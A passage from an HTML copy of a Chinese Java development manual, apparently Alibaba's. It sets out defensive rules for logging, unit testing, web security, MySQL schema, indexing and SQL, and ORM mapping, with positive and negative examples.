<p><font color=" #C00000">【强制】</font>异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。</p>
<p><font color="#019858">正例：</font>logger.error(“inputParams:{} and errorMessage:{}”,  各类参数或者对象toString(), e.getMessage(), e);</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>日志打印时禁止直接用 JSON 工具将对象转换成 String。</p>
<p><font color=" #977C00">说明：</font>如果对象里某些 get 方法被覆写，存在抛出异常的情况，则可能会因为打印日志而影响正常业务流 程的执行。</p>
<p><font color="#019858">正例：</font>打印日志时仅打印出业务相关属性值或者调用其对象的 toString()方法。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>谨慎地记录日志生产环境禁止输出 debug 日志；有选择地输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘撑爆，并记得及时删除这些观察日志。</p>
<p><font color=" #977C00">说明：</font>大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。如非必要，请不要在此场景打出 error 级别，避免频繁报警。</p>
<p><font color=" #977C00">说明：</font>注意日志输出的级别，error 级别只记录系统逻辑出错、异常或者重要的错误信息。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>尽量用英文来描述日志错误信息，如果日志中的错误信息用英文描述不清楚的话使用 中文描述即可，否则容易产生歧义。</p>
<p><font color=" #977C00">说明：</font>国际化团队或海外部署的服务器由于字符集问题，使用全英文来注释和描述日志错误信息。</p>
</li>
</ol>
<h1>三、单元测试</h1>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>好的单元测试必须遵守 AIR原则。</p>
<p><font color=" #977C00">说明：</font>单元测试在线上运行时，感觉像空气（AIR）一样感觉不到，但在测试质量的保障上，却是非常关键 的。好的单元测试宏观上来说，具有自动化、独立性、可重复执行的特点。</p>
<ul>
<li>A：Automatic（自动化）</li>
<li>I：Independent（独立性）</li>
<li>R：Repeatable（可重复）</li>
</ul>
</li>
<li>
<p><font color=" #C00000">【强制】</font>单元测试应该是全自动执行的，并且非交互式的。测试用例通常是被定期执行的，执行过程必须完全自动化才有意义。输出结果需要人工检查的测试不是一个好的单元测试。单元 测试中不准使用 System.out 来进行人肉验证，必须使用 assert 来验证。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>保持单元测试的独立性。为了保证单元测试稳定可靠且便于维护，单元测试用例之间决不能互相调用，也不能依赖执行的先后次序。</p>
<p><font color=" #FF4500">反例：</font>method2 需要依赖 method1 的执行，将执行结果作为 method2 的输入。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>单元测试是可以重复执行的，不能受到外界环境的影响。</p>
<p><font color=" #977C00">说明：</font>单元测试通常会被放到持续集成中，每次有代码 check in 时单元测试都会被执行。如果单测对外部环境（网络、服务、中间件等）有依赖，容易导致持续集成机制的不可用。</p>
<p><font color="#019858">正例：</font>为了不受外界环境影响，要求设计代码时就把 SUT 的依赖改成注入，在测试时用 spring  这样的 DI 框架注入一个本地（内存）实现或者 Mock 实现。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>对于单元测试，要保证测试粒度足够小，有助于精确定位问题。单测粒度至多是类级别，一般是方法级别。</p>
<p><font color=" #977C00">说明：</font>只有测试粒度小才能在出错时尽快定位到出错位置。单测不负责检查跨类或者跨系统的交互逻辑， 那是集成测试的领域。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>核心业务、核心应用、核心模块的增量代码确保单元测试通过。</p>
<p><font color=" #977C00">说明：</font>新增代码及时补充单元测试，如果新增代码影响了原有单元测试，请及时修正。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>单元测试代码必须写在如下工程目录：src/test/java，不允许写在业务代码目录下。</p>
<p><font color=" #977C00">说明：</font>源码编译时会跳过此目录，而单元测试框架默认是扫描此目录。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>单元测试的基本目标：语句覆盖率达到 70%；核心模块的语句覆盖率和分支覆盖率都要达到 100%</p>
<p><font color=" #977C00">说明：</font>在工程规约的应用分层中提到的 DAO 层，Manager层，可重用度高的 Service，都应该进行单元测 试。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>编写单元测试代码遵守 BCDE原则，以保证被测试模块的交付质量。</p>
<ul>
<li>B：Border，边界值测试，包括循环边界、特殊取值、特殊时间点、数据顺序等。</li>
<li>C：Correct，正确的输入，并得到预期的结果。</li>
<li>D：Design，与设计文档相结合，来编写单元测试。</li>
<li>E：Error，强制错误信息输入（如：非法数据、异常流程、业务允许外等），并得到预期的结果。</li>
</ul>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>对于数据库相关的查询，更新，删除等操作，不能假设数据库里的数据是存在的，或者直接操作数据库把数据插入进去，请使用程序插入或者导入数据的方式来准备数据。</p>
<p><font color=" #FF4500">反例：</font>删除某一行数据的单元测试，在数据库中，先直接手动增加一行作为删除目标，但是这一行新增数 据并不符合业务插入规则，导致测试结果异常。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>和数据库相关的单元测试，可以设定自动回滚机制，不给数据库造成脏数据。或者对单元测试产生的数据有明确的前后缀标识。</p>
<p><font color="#019858">正例：</font>在阿里巴巴企业智能事业部的内部单元测试中，使用 ENTERPRISE_INTELLIGENCE _UNIT_TEST_ 的前缀来标识单元测试相关代码。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>对于不可测的代码在适当的时机做必要的重构，使代码变得可测，避免为了达到测试要求而书写不规范测试代码。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>在设计评审阶段，开发人员需要和测试人员一起确定单元测试范围，单元测试最好覆盖所有测试用例（UC）。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>单元测试作为一种质量保障手段，在项目提测前完成单元测试，不建议项目发布后补充单元测试用例。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>为了更方便地进行单元测试，业务代码应避免以下情况：</p>
<ul>
<li>
<p>构造方法中做的事情过多。</p>
</li>
<li>
<p>存在过多的全局变量和静态方法。</p>
</li>
<li>
<p>存在过多的外部依赖。</p>
</li>
<li>
<p>存在过多的条件语句。</p>
</li>
</ul>
<p><font color=" #977C00">说明：</font>多层条件语句建议使用卫语句、策略模式、状态模式等方式重构。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>不要对单元测试存在如下误解：</p>
<ul>
<li>
<p>那是测试同学干的事情。本文是开发手册，凡是本文内容都是与开发同学强相关的。</p>
</li>
<li>
<p>单元测试代码是多余的。系统的整体功能与各单元部件的测试正常与否是强相关的。</p>
</li>
<li>
<p>单元测试代码不需要维护。一年半载后，那么单元测试几乎处于废弃状态。</p>
</li>
<li>
<p>单元测试与线上故障没有辩证关系。好的单元测试能够最大限度地规避线上故障。</p>
</li>
</ul>
</li>
</ol>
<h1>四、安全规约</h1>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>隶属于用户个人的页面或者功能必须进行权限控制校验。</p>
<p><font color=" #977C00">说明：</font>防止没有做水平权限校验就可随意访问、修改、删除别人的数据，比如查看他人的私信内容。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>用户敏感数据禁止直接展示，必须对展示数据进行脱敏。</p>
<p><font color=" #977C00">说明：</font>中国大陆个人手机号码显示：139****1219，隐藏中间 4 位，防止隐私泄露。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>用户输入的 SQL 参数严格使用参数绑定或者 METADATA字段值限定，防止 SQL 注入， 禁止字符串拼接 SQL 访问数据库。</p>
<p><font color=" #FF4500">反例：</font>某系统签名大量被恶意修改，即是因为对于危险字符  # --没有进行转义，导致数据库更新时，where 后边的信息被注释掉，对全库进行更新。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>用户请求传入的任何参数必须做有效性验证。</p>
<p><font color=" #977C00">说明：</font>忽略参数校验可能导致：</p>
<ul>
<li>
<p>page size 过大导致内存溢出</p>
</li>
<li>
<p>恶意 order by 导致数据库慢查询</p>
</li>
<li>
<p>缓存击穿</p>
</li>
<li>
<p>SSRF</p>
</li>
<li>
<p>任意重定向</p>
</li>
<li>
<p>SQL 注入，Shell 注入，反序列化注入</p>
</li>
<li>
<p>正则输入源串拒绝服务 ReDoS</p>
</li>
</ul>
<p>Java 代码用正则来验证客户端的输入，有些正则写法验证普通用户输入没有问题，但是如果攻击人员使用 的是特殊构造的字符串来验证，有可能导致死循环的结果。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁止向 HTML 页面输出未经安全过滤或未正确转义的用户数据。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>表单、AJAX提交必须执行 CSRF 安全验证。</p>
<p><font color=" #977C00">说明：</font>CSRF(Cross-site request forgery)跨站请求伪造是一类常见编程漏洞。对于存在 CSRF 漏洞的应用/ 网站，攻击者可以事先构造好 URL，只要受害者用户一访问，后台便在用户不知情的情况下对数据库中用户参数进行相应修改。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>URL外部重定向传入的目标地址必须执行白名单过滤。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在使用平台资源，譬如短信、邮件、电话、下单、支付，必须实现正确的防重放的机制，如数量限制、疲劳度控制、验证码校验，避免被滥刷而导致资损。</p>
<p><font color=" #977C00">说明：</font>如注册时发送验证码到手机，如果没有限制次数和频率，那么可以利用此功能骚扰到其它用户，并造成短信平台资源浪费。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>发贴、评论、发送即时消息等用户生成内容的场景必须实现防刷、文本内容违禁词过滤等风控策略。</p>
</li>
</ol>
<h1>五、MySQL 数据库</h1>
<h2 id="一-建表规约">(一)  建表规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>表达是与否概念的字段，必须使用 is_xxx 的方式命名，数据类型是 <code>unsigned tinyint</code> （1 表示是，0 表示否）。</p>
<p><font color=" #977C00">说明：</font>任何字段如果为非负数，必须是 unsigned。</p>
<p>注意：POJO 类中的任何布尔类型的变量，都不要加 is 前缀，所以，需要在<resultmap>设置从 is_xxx 到 Xxx的映射关系。数据库表示是与否的值，使用 tinyint 类型，坚持 is_xxx 的命名方式是为了明确其取值含 义与取值范围。</resultmap></p>
<p><font color="#019858">正例：</font>表达逻辑删除的字段名 is_deleted，1 表示删除，0 表示未删除。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>表名、字段名必须使用小写字母或数字，禁止出现数字开头，禁止两个下划线中间只出现数字。数据库字段名的修改代价很大，因为无法进行预发布，所以字段名称需要慎重考虑。</p>
<p><font color=" #977C00">说明：</font>MySQL 在 Windows 下不区分大小写，但在 Linux 下默认是区分大小写。因此，数据库名、表名、 字段名，都不允许出现任何大写字母，避免节外生枝。</p>
<p><font color="#019858">正例：</font>aliyun_admin，rdc_config，level3_name</p>
<p><font color=" #FF4500">反例：</font>AliyunAdmin，rdcConfig，level_3_name</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>表名不使用复数名词。</p>
<p><font color=" #977C00">说明：</font>表名应该仅仅表示表里面的实体内容，不应该表示实体数量，对应于 DO 类名也是单数形式，符合表达习惯。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁用保留字，如 desc、range、match、delayed 等，请参考 MySQL 官方保留字。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>主键索引名为 pk_字段名；唯一索引名为 uk_字段名；普通索引名则为 idx_字段名。</p>
<p><font color=" #977C00">说明：</font>pk_  即 primary key；uk_  即 unique key；idx_  即 index 的简称。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>小数类型为 decimal，禁止使用 float 和 double。</p>
<p><font color=" #977C00">说明：</font>在存储的时候，float  和 double  都存在精度损失的问题，很可能在比较值的时候，得到不正确的结果。如果存储的数据范围超过 decimal  的范围，建议将数据拆成整数和小数并分开存储。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如果存储的字符串长度几乎相等，使用 char 定长字符串类型。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度 大于此值，定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效 率。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>表必备三字段：id, create_time, update_time。</p>
<p><font color=" #977C00">说明：</font>其中 id 必为主键，类型为 bigint unsigned、单表时自增、步长为 1。create_time, update_time 的类型均为 datetime 类型，前者现在时表示主动式创建，后者过去分词表示被动式更新。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>表的命名最好是遵循“业务名称_表的作用”。</p>
<p><font color="#019858">正例：</font>alipay_task / force_project / trade_config</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>库名与应用名称尽量一致。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>如果修改字段含义或对字段表示的状态追加时，需要及时更新字段注释。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>字段允许适当冗余，以提高查询性能，但必须考虑数据一致。冗余字段应遵循：</p>
<ul>
<li>
<p>不是频繁修改的字段。</p>
</li>
<li>
<p>不是唯一索引的字段。</p>
</li>
<li>
<p>不是 varchar 超长字段，更不能是 text 字段。</p>
</li>
</ul>
<p><font color="#019858">正例：</font>各业务线经常冗余存储商品名称，避免查询时需要调用 IC 服务获取。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。</p>
<p><font color=" #977C00">说明：</font>如果预计三年后的数据量根本达不到这个级别，请不要在创建表时就分库分表。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>合适的字符存储长度，不但节约数据库表空间、节约索引存储，更重要的是提升检索 速度。</p>
<p><font color="#019858">正例：</font>无符号值可以避免误存负数，且扩大了表示范围。</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>年龄区间</th>
<th>类型</th>
<th>字节</th>
<th>表示范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>人</td>
<td>150 岁之内</td>
<td>tinyint unsigned</td>
<td>1</td>
<td>无符号值：0 到 255</td>
</tr>
<tr>
<td>龟</td>
<td>数百岁</td>
<td>smallint unsigned</td>
<td>2</td>
<td>无符号值：0 到 65535</td>
</tr>
<tr>
<td>恐龙化石</td>
<td>数千万年</td>
<td>int unsigned</td>
<td>4</td>
<td>无符号值：0 到约 43 亿</td>
</tr>
<tr>
<td>太阳</td>
<td>约 50 亿年</td>
<td>bigint unsigned</td>
<td>8</td>
<td>无符号值：0 到约 10 的 19 次方</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h2 id="二-索引规约">(二)  索引规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>业务上具有唯一特性的字段，即使是组合字段，也必须建成唯一索引。</p>
<p><font color=" #977C00">说明：</font>不要以为唯一索引影响了 insert 速度，这个速度损耗可以忽略，但提高查找速度是明显的；另外， 即使在应用层做了非常完善的校验控制，只要没有唯一索引，根据墨菲定律，必然有脏数据产生。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>超过三个表禁止 join。==需要 join 的字段，数据类型保持绝对一致==；多表关联查询时， 保证被关联的字段需要有索引。</p>
<p><font color=" #977C00">说明：</font>即使双表 join 也要注意表索引、SQL 性能。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据 实际文本区分度决定索引长度。</p>
<p><font color=" #977C00">说明：</font>索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90% 以上，可以使用<code>count(distinct left(列名,  索引长度))/count(\*)</code>的区分度来确定。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。</p>
<p><font color=" #977C00">说明：</font>索引文件具有 B-Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>如果有order by的场景，请注意利用索引的有序性。order by 最后的字段是组合索引的一部分，并且放在索引组合顺序的最后，避免出现file_sort的情况，影响查询性能。</p>
<p><font color="#019858">正例：</font>where a=? and b=? order by c;  索引：a_b_c</p>
<p><font color=" #FF4500">反例：</font>索引如果存在范围查询，那么索引有序性无法利用，如： WHERE a&gt;10 ORDER BY b; 索引a_b无法排序。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>利用覆盖索引来进行查询操作，避免回表。</p>
<p><font color=" #977C00">说明：</font>如果一本书需要知道第 11 章是什么标题，会翻开第 11 章对应的那一页吗？目录浏览一下就好，这 个目录就是起到覆盖索引的作用。</p>
<p><font color="#019858">正例：</font>能够建立索引的种类分为主键索引、唯一索引、普通索引三种，而覆盖索引只是一种查询的一种效 果，用 explain 的结果，extra 列会出现：using index。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>利用延迟关联或者子查询优化超多分页场景。</p>
<p><font color=" #977C00">说明：</font>MySQL 并不是跳过 offset 行，而是取 offset+N 行，然后返回放弃前 offset 行，返回 N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。</p>
<p><font color="#019858">正例：</font>先快速定位需要获取的 id 段，然后再关联：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">FROM</span>  表 <span class="token number">1</span> <span class="token keyword">as</span> t1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> id <span class="token keyword">from</span>  表 <span class="token number">1</span> <span class="token keyword">where</span>  条件  <span class="token keyword">LIMIT</span> <span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">20</span> <span class="token punctuation">)</span> <span class="token keyword">as</span> t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>id<span class="token operator">=</span>t2<span class="token punctuation">.</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>SQL 性能优化的目标：至少要达到 range  级别，要求是 ref 级别，如果可以是 consts 最好。</p>
<p><font color=" #977C00">说明：</font></p>
<ul>
<li>
<p>consts  单表中最多只有一个匹配行（主键或者唯一索引），在优化阶段即可读取到数据。</p>
</li>
<li>
<p>ref  指的是使用普通的索引（normal index）。</p>
</li>
<li>
<p>range  对索引进行范围检索。</p>
</li>
</ul>
<p><font color=" #FF4500">反例：</font>explain 表的结果，type=index，索引物理文件全扫描，速度非常慢，这个 index 级别比较 range 还低，与全表扫描是小巫见大巫。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>建组合索引的时候，区分度最高的在最左边。</p>
<p><font color="#019858">正例：</font>如果 where a=? and b=?，a 列的几乎接近于唯一值，那么只需要单建 idx_a 索引即可。</p>
<p><font color=" #977C00">说明：</font>存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如：where c&gt;? and d=? 那么即使 c 的区分度更高，也必须把 d 放在索引的最前列，即建立组合索引 idx_d_c。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>防止因字段类型不同造成的隐式转换，导致索引失效。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>创建索引时避免有如下极端误解：</p>
<ul>
<li>
<p>索引宁滥勿缺。认为一个查询就需要建一个索引。</p>
</li>
<li>
<p>吝啬索引的创建。认为索引会消耗空间、严重拖慢记录的更新以及行的新增速度。</p>
</li>
<li>
<p>抵制惟一索引。认为惟一索引一律需要在应用层通过“先查后插”方式解决。</p>
</li>
</ul>
</li>
</ol>
<h2 id="三-SQL-语句">(三)  SQL 语句</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>不要使用 count(列名)或 count(常量)来替代 count(*)，count(*)是 SQL92 定义的标 准统计行数的语法，跟数据库无关，跟 NULL和非 NULL无关。</p>
<p><font color=" #977C00">说明：</font>==count(*)会统计值为 NULL的行，而 count(列名)不会统计此列为 NULL值的行==</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>count(distinct col)  计算该列除 NULL之外的不重复行数，注意  count(distinct col1, col2)  如果其中一列全为 NULL，那么即使另一列有不同的值，也返回为 0。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>当某一列的值全是 NULL时，count(col)的返回结果为 0，但 sum(col)的返回结果为 NULL，因此使用 sum()时需注意 NPE 问题。</p>
<p><font color="#019858">正例：</font>可以使用如下方式来避免 sum 的 NPE 问题：<code>SELECT IFNULL(SUM(column), 0) FROM table</code>;</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>使用 ISNULL()来判断是否为 NULL值。</p>
<p><font color=" #977C00">说明：</font>==NULL与任何值的直接比较都为 NULL==。</p>
<p>1）  <font color="#0000FF">NULL&lt;&gt;NULL</font> 的返回结果是 NULL，而不是 false。</p>
<p>2）  <font color="#0000FF">NULL=NULL</font> 的返回结果是 NULL，而不是 true。</p>
<p>3）  <font color="#0000FF">NULL&lt;&gt;1</font> 的返回结果是 NULL，而不是 true。</p>
<p><font color=" #FF4500">反例：</font>在 SQL 语句中，如果在 null 前换行，影响可读性。select * from table where column1 is null and column3 is not null;  而 ISNULL(column) 是一个整体，简洁易懂。从性能数据上分析， ISNULL(column) 执行效率更快一些。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>代码中写分页查询逻辑时，若 count 为 0 应直接返回，避免执行后面的分页语句。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不得使用外键与级联，一切外键概念必须在应用层解决。</p>
<p><font color=" #977C00">说明：</font>（概念解释）学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，即为级联更新。</p>
<p>外键与级联更新适用于单机 低并发，不适合分布式、高并发集群；</p>
<p>级联更新是强阻塞，存在数据库更新风暴的风险；</p>
<p>外键影响数据库的插入速度。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>数据订正（特别是删除或修改记录操作）时，要先 select，避免出现误删除，确认无 误才能执行更新语句。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>对于数据库中表记录的查询和变更，只要涉及多个表，都需要在列名前加表的别名（或表名）进行限定。</p>
<p><font color=" #977C00">说明：</font>对多表进行查询记录、更新记录、删除记录时，如果对操作列没有限定表的别名（或表名），并且操作列在多个表中存在时，就会抛异常。</p>
<p><font color="#019858">正例：</font>select <a href="http://t1.name">t1.name</a> from table_first as t1 , table_second as t2 where <a href="http://t1.id=t2.id">t1.id=t2.id</a>;</p>
<p><font color=" #FF4500">反例：</font>在某业务中，由于多表关联查询语句没有加表的别名（或表名）的限制，正常运行两年后，最近在 某个表中增加一个同名字段，在预发布环境做数据库变更后，线上查询语句出现出 1052 异常：Column ‘name’ in field list is ambiguous。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>SQL 语句中表的别名前加 as，并且以 t1、t2、t3、…的顺序依次命名。</p>
<p><font color=" #977C00">说明：</font></p>
<p>1）别名可以是表的简称，或者是依照表在 SQL 语句中出现的顺序，以 t1、t2、t3 的方式命名。</p>
<p>2） 别名前加 as 使别名更容易识别。</p>
<p><font color="#019858">正例：</font>select <a href="http://t1.name">t1.name</a> from table_first as t1, table_second as t2 where <a href="http://t1.id=t2.id">t1.id=t2.id</a>;</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>in 操作能避免则避免，若实在避免不了，需要仔细评估 in 后边的集合元素数量，控制在 1000 个之内。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>因国际化需要，所有的字符存储与表示，均采用 utf8 字符集，那么字符计数方法需 要注意。</p>
<p><font color=" #977C00">说明：</font></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LENGTH<span class="token punctuation">(</span><span class="token string">"轻松工作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  返回为 <span class="token number">12</span> 
<span class="token keyword">SELECT</span> CHARACTER_LENGTH<span class="token punctuation">(</span><span class="token string">"轻松工作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 返回为 <span class="token number">4</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果需要存储表情，那么选择 utf8mb4 来进行存储，注意它与 utf8 编码的区别。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>TRUNCATE TABLE  比  DELETE  速度快，且使用的系统和事务日志资源少，但 TRUNCATE 无事务且不触发 trigger，有可能造成事故，故不建议在开发代码中使用此语句。</p>
<p><font color=" #977C00">说明：</font>TRUNCATE TABLE 在功能上与不带  WHERE  子句的  DELETE 语句相同。</p>
</li>
</ol>
<h2 id="四-ORM-映射">(四)  ORM 映射</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>在表查询中，一律不要使用  * 作为查询的字段列表，需要哪些字段必须明确写明。</p>
<p><font color=" #977C00">说明：</font></p>
<p>1）增加查询分析器解析成本。</p>
<p>2）增减字段容易与 resultMap 配置不一致。</p>
<p>3）无用字段增加网络 消耗，尤其是 text 类型的字段。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>POJO 类的布尔属性不能加 is，而数据库字段必须加 is_，要求在 resultMap 中进行字段与属性之间的映射。</p>
<p><font color=" #977C00">说明：</font>参见定义 POJO 类以及数据库字段定义规定，在 sql.xml 增加映射，是必须的。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不要用 resultClass 当返回参数，即使所有类属性名与数据库字段一一对应，也需要 定义<resultmap>；反过来，每一个表也必然有一个<resultmap>与之对应。</resultmap></resultmap></p>
<p><font color=" #977C00">说明：</font>配置映射关系，使字段与 DO 类解耦，方便维护。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>sql.xml 配置参数使用：#{}，#param#  不要使用${} 此种方式容易出现 SQL 注入。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>iBATIS自带的 queryForList(String statementName,int start,int size)不推荐使用。</p>
<p><font color=" #977C00">说明：</font>其实现方式是在数据库取到 statementName 对应的 SQL 语句的所有记录，再通过 subList 取 start,size 的子集合。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">&gt;</span> map <span class="token operator">=</span> new HashMap<span class="token operator">&lt;&gt;</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
map<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token keyword">start</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
map<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"size"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不允许直接拿 HashMap 与 Hashtable 作为查询结果集的输出。</p>
<p><font color=" #FF4500">反例：</font>某同学为避免写一个<resultmap>xxx</resultmap>，直接使用 HashTable 来接收数据库返回结果，结果出现日常是把 bigint 转成 Long 值，而线上由于数据库版本不一样，解析成 BigInteger，导致线上问题。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>更新数据表记录时，必须同时更新记录对应的 update_time 字段值为当前时间。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不要写一个大而全的数据更新接口。传入为 POJO 类，不管是不是自己的目标更新字 段，都进行 update table set c1=value1,c2=value2,c3=value3;  这是不对的。执行 SQL 时， 不要更新无改动的字段，一是易出错；二是效率低；三是增加 binlog 存储。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>@Transactional 事务不要滥用。事务会影响数据库的 QPS，另外使用事务的地方需 要考虑各方面的回滚方案，包括缓存回滚、搜索引擎回滚、消息补偿、统计修正等。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font><code>&lt;isEqual&gt;</code>中的 compareValue 是与属性值对比的常量，一般是数字，表示相等时带上此条件；<code>&lt;isNotEmpty&gt;</code>表示不为空且不为 null 时执行；<code>&lt;isNotNull&gt;</code>表示不为 null 值 时执行。</p>
</li>
</ol>
<h1>六、工程结构</h1>
<h2 id="一-应用分层">(一)  应用分层</h2>
<ol>
<li>
<p><font color=" #FFC000">【推荐】</font>根据业务架构实践，结合业界分层规范与流行技术框架分析，推荐分层结构如图所示， 默认上层依赖于下层，箭头关系表示可直接依赖，如：开放 API 层可以依赖于 Web 层 （Controller 层），也可以直接依赖于 Service 层，依此类推</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/c1388515-ad59-431d-8473-6b507ce22f68.jpeg" alt=""></p>
<ul>
<li>
<p>开放 API 层：可直接封装 Service 接口暴露成 RPC 接口；通过 Web 封装成 http 接口；网关控制层等。</p>
</li>
<li>
<p>终端显示层：各个端的模板渲染并执行显示的层。当前主要是 velocity 渲染，JS 渲染，JSP 渲染，移 动端展示等。</p>
</li>
<li>
<p>Web 层：主要是对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理等。</p>
</li>
<li>
<p>Service 层：相对具体的业务逻辑服务层。</p>
</li>
<li>
<p>Manager 层：通用业务处理层，它有如下特征：</p>
<p>1） 对第三方平台封装的层，预处理返回结果及转化异常信息，适配上层接口。</p>
